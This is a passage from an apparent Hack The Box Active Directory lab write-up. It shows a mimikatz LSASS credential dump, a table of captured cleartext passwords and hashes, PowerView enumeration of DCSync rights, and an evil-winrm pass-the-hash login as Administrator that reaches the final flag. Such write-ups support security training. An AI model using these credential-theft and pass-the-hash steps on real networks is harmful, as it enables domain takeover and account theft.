Logon Server      : (null)
Logon Time        : 8/13/2026 12:55:47 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : INLANEFREIGHT
         * NTLM     : 27d07745b74f6d4c124f313bbec9da45
         * SHA1     : 7a3bb329ab83e7af1d90965012f8b31e410f773a
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : INLANEFREIGHT
         * Password : cd 81 50 1f af 94 ff 6c ee d4 9f 90 21 36 99 04 55 bb ea 7c c6 d4 80 56 b6 c5 92 9e cd 83 fc 82 9a c5 c2 87 74 86 6d 6d 33 f9 e5 e3 ca 77 fe c1 47 b5 46 87 fb f6 7d 0d cc 86 65 f5 e8 8a 07 c0 cf 6c b1 4a 3e bd 1b 7a 6b 2e de fb 3f c8 0f db 9e cc 73 0a 81 1d a7 bf f6 7a 9f 2a 9d bc 03 da c9 09 fb 38 61 6a 25 d8 62 7f 70 4f 9c d0 9e 87 c2 ad f8 73 68 0e 5f f1 75 42 0f 85 e6 c1 f5 22 3b 7e 5d ed 5f 32 10 a8 39 64 20 92 bb 9a ef 24 50 06 d9 c0 95 ac 2b 1f 5b 36 ec 25 ed 2c 63 b2 5d d7 36 ce 18 a4 b1 cb 16 8b 8a 24 d1 cb 3d 76 be 6b d9 4b 10 ce 43 1f cd b1 5f 01 e3 1a 30 bb 56 7b 23 42 fb 72 d4 c2 b5 fb 22 68 80 34 58 c8 bd 7d 1b 09 57 aa 98 4f ec 37 1c e5 0f 6a 2c 8b a0 af 02 05 fd 61 6b 27 ac 4d de ca 40 f0 6c fe
        kerberos :
         * Username : ms01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 36071 (00000000:00008ce7)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 8/13/2026 12:55:47 AM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : INLANEFREIGHT
         * NTLM     : 27d07745b74f6d4c124f313bbec9da45
         * SHA1     : 7a3bb329ab83e7af1d90965012f8b31e410f773a
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : INLANEFREIGHT
         * Password : cd 81 50 1f af 94 ff 6c ee d4 9f 90 21 36 99 04 55 bb ea 7c c6 d4 80 56 b6 c5 92 9e cd 83 fc 82 9a c5 c2 87 74 86 6d 6d 33 f9 e5 e3 ca 77 fe c1 47 b5 46 87 fb f6 7d 0d cc 86 65 f5 e8 8a 07 c0 cf 6c b1 4a 3e bd 1b 7a 6b 2e de fb 3f c8 0f db 9e cc 73 0a 81 1d a7 bf f6 7a 9f 2a 9d bc 03 da c9 09 fb 38 61 6a 25 d8 62 7f 70 4f 9c d0 9e 87 c2 ad f8 73 68 0e 5f f1 75 42 0f 85 e6 c1 f5 22 3b 7e 5d ed 5f 32 10 a8 39 64 20 92 bb 9a ef 24 50 06 d9 c0 95 ac 2b 1f 5b 36 ec 25 ed 2c 63 b2 5d d7 36 ce 18 a4 b1 cb 16 8b 8a 24 d1 cb 3d 76 be 6b d9 4b 10 ce 43 1f cd b1 5f 01 e3 1a 30 bb 56 7b 23 42 fb 72 d4 c2 b5 fb 22 68 80 34 58 c8 bd 7d 1b 09 57 aa 98 4f ec 37 1c e5 0f 6a 2c 8b a0 af 02 05 fd 61 6b 27 ac 4d de ca 40 f0 6c fe
        kerberos :
         * Username : MS01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : cd 81 50 1f af 94 ff 6c ee d4 9f 90 21 36 99 04 55 bb ea 7c c6 d4 80 56 b6 c5 92 9e cd 83 fc 82 9a c5 c2 87 74 86 6d 6d 33 f9 e5 e3 ca 77 fe c1 47 b5 46 87 fb f6 7d 0d cc 86 65 f5 e8 8a 07 c0 cf 6c b1 4a 3e bd 1b 7a 6b 2e de fb 3f c8 0f db 9e cc 73 0a 81 1d a7 bf f6 7a 9f 2a 9d bc 03 da c9 09 fb 38 61 6a 25 d8 62 7f 70 4f 9c d0 9e 87 c2 ad f8 73 68 0e 5f f1 75 42 0f 85 e6 c1 f5 22 3b 7e 5d ed 5f 32 10 a8 39 64 20 92 bb 9a ef 24 50 06 d9 c0 95 ac 2b 1f 5b 36 ec 25 ed 2c 63 b2 5d d7 36 ce 18 a4 b1 cb 16 8b 8a 24 d1 cb 3d 76 be 6b d9 4b 10 ce 43 1f cd b1 5f 01 e3 1a 30 bb 56 7b 23 42 fb 72 d4 c2 b5 fb 22 68 80 34 58 c8 bd 7d 1b 09 57 aa 98 4f ec 37 1c e5 0f 6a 2c 8b a0 af 02 05 fd 61 6b 27 ac 4d de ca 40 f0 6c fe
        ssp :
        credman :

Authentication Id : 0 ; 35975 (00000000:00008c87)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 8/13/2026 12:55:47 AM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : INLANEFREIGHT
         * NTLM     : 27d07745b74f6d4c124f313bbec9da45
         * SHA1     : 7a3bb329ab83e7af1d90965012f8b31e410f773a
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : INLANEFREIGHT
         * Password : cd 81 50 1f af 94 ff 6c ee d4 9f 90 21 36 99 04 55 bb ea 7c c6 d4 80 56 b6 c5 92 9e cd 83 fc 82 9a c5 c2 87 74 86 6d 6d 33 f9 e5 e3 ca 77 fe c1 47 b5 46 87 fb f6 7d 0d cc 86 65 f5 e8 8a 07 c0 cf 6c b1 4a 3e bd 1b 7a 6b 2e de fb 3f c8 0f db 9e cc 73 0a 81 1d a7 bf f6 7a 9f 2a 9d bc 03 da c9 09 fb 38 61 6a 25 d8 62 7f 70 4f 9c d0 9e 87 c2 ad f8 73 68 0e 5f f1 75 42 0f 85 e6 c1 f5 22 3b 7e 5d ed 5f 32 10 a8 39 64 20 92 bb 9a ef 24 50 06 d9 c0 95 ac 2b 1f 5b 36 ec 25 ed 2c 63 b2 5d d7 36 ce 18 a4 b1 cb 16 8b 8a 24 d1 cb 3d 76 be 6b d9 4b 10 ce 43 1f cd b1 5f 01 e3 1a 30 bb 56 7b 23 42 fb 72 d4 c2 b5 fb 22 68 80 34 58 c8 bd 7d 1b 09 57 aa 98 4f ec 37 1c e5 0f 6a 2c 8b a0 af 02 05 fd 61 6b 27 ac 4d de ca 40 f0 6c fe
        kerberos :
         * Username : MS01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : cd 81 50 1f af 94 ff 6c ee d4 9f 90 21 36 99 04 55 bb ea 7c c6 d4 80 56 b6 c5 92 9e cd 83 fc 82 9a c5 c2 87 74 86 6d 6d 33 f9 e5 e3 ca 77 fe c1 47 b5 46 87 fb f6 7d 0d cc 86 65 f5 e8 8a 07 c0 cf 6c b1 4a 3e bd 1b 7a 6b 2e de fb 3f c8 0f db 9e cc 73 0a 81 1d a7 bf f6 7a 9f 2a 9d bc 03 da c9 09 fb 38 61 6a 25 d8 62 7f 70 4f 9c d0 9e 87 c2 ad f8 73 68 0e 5f f1 75 42 0f 85 e6 c1 f5 22 3b 7e 5d ed 5f 32 10 a8 39 64 20 92 bb 9a ef 24 50 06 d9 c0 95 ac 2b 1f 5b 36 ec 25 ed 2c 63 b2 5d d7 36 ce 18 a4 b1 cb 16 8b 8a 24 d1 cb 3d 76 be 6b d9 4b 10 ce 43 1f cd b1 5f 01 e3 1a 30 bb 56 7b 23 42 fb 72 d4 c2 b5 fb 22 68 80 34 58 c8 bd 7d 1b 09 57 aa 98 4f ec 37 1c e5 0f 6a 2c 8b a0 af 02 05 fd 61 6b 27 ac 4d de ca 40 f0 6c fe
        ssp :
        credman :

Authentication Id : 0 ; 251427 (00000000:0003d623)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 8/13/2026 12:56:04 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : INLANEFREIGHT
         * NTLM     : 27d07745b74f6d4c124f313bbec9da45
         * SHA1     : 7a3bb329ab83e7af1d90965012f8b31e410f773a
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : INLANEFREIGHT
         * Password : cd 81 50 1f af 94 ff 6c ee d4 9f 90 21 36 99 04 55 bb ea 7c c6 d4 80 56 b6 c5 92 9e cd 83 fc 82 9a c5 c2 87 74 86 6d 6d 33 f9 e5 e3 ca 77 fe c1 47 b5 46 87 fb f6 7d 0d cc 86 65 f5 e8 8a 07 c0 cf 6c b1 4a 3e bd 1b 7a 6b 2e de fb 3f c8 0f db 9e cc 73 0a 81 1d a7 bf f6 7a 9f 2a 9d bc 03 da c9 09 fb 38 61 6a 25 d8 62 7f 70 4f 9c d0 9e 87 c2 ad f8 73 68 0e 5f f1 75 42 0f 85 e6 c1 f5 22 3b 7e 5d ed 5f 32 10 a8 39 64 20 92 bb 9a ef 24 50 06 d9 c0 95 ac 2b 1f 5b 36 ec 25 ed 2c 63 b2 5d d7 36 ce 18 a4 b1 cb 16 8b 8a 24 d1 cb 3d 76 be 6b d9 4b 10 ce 43 1f cd b1 5f 01 e3 1a 30 bb 56 7b 23 42 fb 72 d4 c2 b5 fb 22 68 80 34 58 c8 bd 7d 1b 09 57 aa 98 4f ec 37 1c e5 0f 6a 2c 8b a0 af 02 05 fd 61 6b 27 ac 4d de ca 40 f0 6c fe
        kerberos :
         * Username : MS01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : cd 81 50 1f af 94 ff 6c ee d4 9f 90 21 36 99 04 55 bb ea 7c c6 d4 80 56 b6 c5 92 9e cd 83 fc 82 9a c5 c2 87 74 86 6d 6d 33 f9 e5 e3 ca 77 fe c1 47 b5 46 87 fb f6 7d 0d cc 86 65 f5 e8 8a 07 c0 cf 6c b1 4a 3e bd 1b 7a 6b 2e de fb 3f c8 0f db 9e cc 73 0a 81 1d a7 bf f6 7a 9f 2a 9d bc 03 da c9 09 fb 38 61 6a 25 d8 62 7f 70 4f 9c d0 9e 87 c2 ad f8 73 68 0e 5f f1 75 42 0f 85 e6 c1 f5 22 3b 7e 5d ed 5f 32 10 a8 39 64 20 92 bb 9a ef 24 50 06 d9 c0 95 ac 2b 1f 5b 36 ec 25 ed 2c 63 b2 5d d7 36 ce 18 a4 b1 cb 16 8b 8a 24 d1 cb 3d 76 be 6b d9 4b 10 ce 43 1f cd b1 5f 01 e3 1a 30 bb 56 7b 23 42 fb 72 d4 c2 b5 fb 22 68 80 34 58 c8 bd 7d 1b 09 57 aa 98 4f ec 37 1c e5 0f 6a 2c 8b a0 af 02 05 fd 61 6b 27 ac 4d de ca 40 f0 6c fe
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 8/13/2026 12:55:48 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

mimikatz #
```

```
|**Exposed Data Type**|**Field Name in Output**|**What It Demonstrates**|
|---|---|---|
|**Cleartext Password**|`Password : Sup3rS3cur3D0m@inU2eR`|Demonstrates that **WDigest** is actively caching plaintext domain credentials in memory.|
|**Target User Account**|`User Name : tpetty`|Identifies the compromised user context exposed in memory.|
|**NTLM Hash**|`NTLM : fd37b6fec5704cadabb319cebf9e3a3a`|Proves that **MSV1_0** NTLM hashes are vulnerable to Pass-the-Hash attacks.|
|**Service Account Pass**|`Password : lucky7`|Shows service account credentials (`svc_sql`) residing in process memory across active sessions.|
|**System Debug Rights**|`Privilege '20' OK`|Proves `lsass.exe` lacks **LSA Protection (RunAsPPL)**, allowing debug handles to read process memory.|
```

```
runas /user:INLANEFREIGHT.LOCAL\tpetty "powershell.exe"
```

```
PS C:\Users\Public> $sid = (Get-DomainUser -Identity tpetty).objectsid
PS C:\Users\Public> Get-DomainObjectAcl | Where-Object { $_.SecurityIdentifier -eq $sid }


ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ObjectSID              : S-1-5-21-2270287766-1317258649-2146029398
ActiveDirectoryRights  : ExtendedRight
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 89e95b76-444d-4c62-991a-0facbeda640c
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 256
SecurityIdentifier     : S-1-5-21-2270287766-1317258649-2146029398-4607
AceType                : AccessAllowedObject
AceFlags               : None
IsInherited            : False
InheritanceFlags       : None
PropagationFlags       : None
AuditFlags             : None

ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ObjectSID              : S-1-5-21-2270287766-1317258649-2146029398
ActiveDirectoryRights  : ExtendedRight
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 256
SecurityIdentifier     : S-1-5-21-2270287766-1317258649-2146029398-4607
AceType                : AccessAllowedObject
AceFlags               : None
IsInherited            : False
InheritanceFlags       : None
PropagationFlags       : None
AuditFlags             : None

ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ObjectSID              : S-1-5-21-2270287766-1317258649-2146029398
ActiveDirectoryRights  : ExtendedRight
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 256
SecurityIdentifier     : S-1-5-21-2270287766-1317258649-2146029398-4607
AceType                : AccessAllowedObject
AceFlags               : None
IsInherited            : False
InheritanceFlags       : None
PropagationFlags       : None
AuditFlags             : None
```

here we can see user tpetty has extended rights DCsync.

We can also use resolveguid.

```
PS C:\Users\Public> Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.SecurityIdentifier -eq $sid }


AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-2270287766-1317258649-2146029398
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2270287766-1317258649-2146029398-4607
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-2270287766-1317258649-2146029398
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2270287766-1317258649-2146029398-4607
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-All
ObjectSID              : S-1-5-21-2270287766-1317258649-2146029398
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2270287766-1317258649-2146029398-4607
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

```

```
┌──(satoru㉿satoru)-[~/Desktop/HTB/CPTS/AD]
└─$ evil-winrm -i 172.16.6.3 -u 'Administrator' -H '27dedb1dab4d8545c6e1c66fba077da0'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                           
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\flag.txt

```

and thats the final flag of the skill assessment part 1.

